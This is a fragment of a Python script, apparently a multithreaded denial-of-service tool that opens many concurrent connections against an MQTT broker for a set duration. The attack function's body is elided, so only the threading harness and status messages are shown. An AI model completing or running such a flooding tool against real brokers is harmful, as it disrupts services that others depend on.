...
def attack(broker, port, thread_id, duration):
    try:
...
if __name__ == "__main__":
    ...
    print(f"Starting Application-level MQTT attack against {args.broker}:{args.port} with {args.threads} threads for {args.duration}s...")

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack, args=(args.broker, args.port, i, args.duration))
        t.start()
        threads.append(t)
    ...
    print(f"[+] Attack finished. {args.threads} connections closed.")
